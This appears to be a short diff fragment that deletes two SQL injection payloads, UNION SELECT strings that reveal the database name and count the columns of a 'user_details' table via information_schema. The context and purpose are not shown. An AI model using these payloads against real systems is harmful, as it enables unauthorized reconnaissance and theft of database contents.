@@ -1,2 +1,0 @@
-' union select database(),null;#
-' union select null, count(column_name) from information_schema.columns where table_name='user_details';#
